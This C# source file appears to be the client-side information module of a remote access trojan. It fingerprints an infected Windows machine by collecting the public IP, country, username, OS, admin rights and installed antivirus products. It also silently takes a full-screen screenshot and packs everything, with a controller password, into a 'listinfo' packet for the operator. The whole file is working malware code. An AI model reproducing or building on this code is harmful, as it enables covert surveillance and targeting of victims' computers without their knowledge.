using Client.Handlers;
using System;
using System.Collections.Generic;
using System.Management;
using System.Security.Principal;
using Microsoft.VisualBasic.Devices;
using System.Drawing;
using System.IO;
using System.Drawing.Imaging;
using System.Windows.Forms;
using System.Device.Location;

namespace Client.Things
{
    internal class Info
    {
        public byte[] Get()
        {
            GeoInfo.Get();
            Stuff.Pack meow = new Stuff.Pack();
            meow.Set("Packet", "listinfo");
            meow.Set("IP", GeoInfo.WanIpAddress);
            meow.Set("Group", Config.Tag);
            meow.Set("Country", GeoInfo.Country);
            meow.Set("UID", UID.Get());
            meow.Set("Username", Environment.UserName);
            meow.Set("Os", (new ComputerInfo().OSFullName.ToString().Replace("Microsoft", null) + " " +
            Environment.Is64BitOperatingSystem.ToString().Replace("True", "64bit").Replace("False", "32bit")).Trim());
            meow.Set("Executing", IsAdmin().ToString().ToLower().Replace("true", "Administrator").Replace("false", "User"));
            meow.Set("AV", GetAntivirus());
            meow.Set("Pass", Config.Password);
            using (Bitmap screenshot = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height))
            using (Graphics g = Graphics.FromImage(screenshot))
            using (MemoryStream ms = new MemoryStream())
            {
                g.CopyFromScreen(0, 0, 0, 0, screenshot.Size);
                screenshot.Save(ms, ImageFormat.Jpeg);
                meow.Set("Image", ms.ToArray());
            }
            return meow.Pacc();
        }
            private static bool IsAdmin()
            {
                return new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator);
            }

            public static string GetAntivirus()
            {
                try
                {
                    using (ManagementObjectSearcher antiVirusSearch = new ManagementObjectSearcher(@"\\" + Environment.MachineName + @"\root\SecurityCenter2", "Select * from AntivirusProduct"))
                    {
                        List<string> av = new List<string>();
                        foreach (ManagementBaseObject searchResult in antiVirusSearch.Get())
                        {
                            av.Add(searchResult["displayName"].ToString());
                        }
                        if (av.Count == 0) return "N/A";
                        return string.Join(", ", av.ToArray());
                    }
                }
                catch
                {
                    return "N/A";

                }
            }
    }
    }